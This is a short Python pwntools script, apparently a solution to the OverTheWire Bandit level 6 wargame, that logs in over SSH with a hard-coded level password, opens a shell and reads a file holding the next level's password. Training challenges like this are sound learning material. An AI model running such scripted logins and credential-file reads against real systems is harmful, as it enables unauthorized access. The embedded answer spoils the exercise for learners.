#!/usr/bin/env python
from pwn import *

log.info('overthewire.org - bandit6 exploit by SKane')

shell = ssh('bandit6', 'bandit.labs.overthewire.org', password='DXjZPULLxYr17uwoI01bNLQbtFemEgo7', port=2220)

sh = shell.run('sh')

sh.sendline('cat /var/lib/dpkg/info/bandit7.password')

log.success("Password for bandit7: " + sh.recvline())
